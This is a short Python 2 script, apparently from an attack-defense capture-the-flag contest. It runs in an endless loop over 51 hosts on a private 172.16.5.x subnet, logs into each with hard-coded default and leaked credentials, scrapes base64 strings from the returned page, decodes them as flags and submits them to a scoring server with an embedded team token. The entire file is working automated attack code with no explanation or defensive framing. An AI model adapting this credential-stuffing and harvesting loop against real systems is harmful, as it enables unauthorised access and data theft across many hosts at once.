# !/usr/bin/env python
#  -*- coding: utf-8 -*-
import requests
import re


def poc(id):
    def test_user(u, p):
        d = {'username': u,
             'password': p}
        s = requests.session()
        r = s.post(login, data=d, timeout=2)
        if 'Welcome' in r.content:
            r1 = s.get(index, timeout=2)
            res = re.findall(r'base64,(.*?)\'', r1.content)
            for each in res:
                if len(each):
                    [postflag(ans=each.decode('base64')) for i in range(3)]

    try:
        id = int(id)
        if id == 28:
            return False

        url = 'http://172.16.5.{}:5001/'.format(id + 9)
        login = url + 'index/login'
        index = url + 'index'

        test_user('111111', '111111')
        test_user('admin', 'YSMSuvMrqPto')

    except Exception, e:
        pass


def postflag(ans, token='bc5b6ad6c9f08fb9600ef7a702e6bf1d'):
    ans = ans.strip()
    if len(ans) == len('bba9a3ad-08c8-4e1b-a6cd-ac2a3cabc143'):
        r = requests.post(url='http://172.16.4.1/Common/submitAnswer', data={'token': token, 'answer': ans})
        print(r.content)


if __name__ == '__main__':
    while 1:
        for i in range(51):
            poc(str(i))
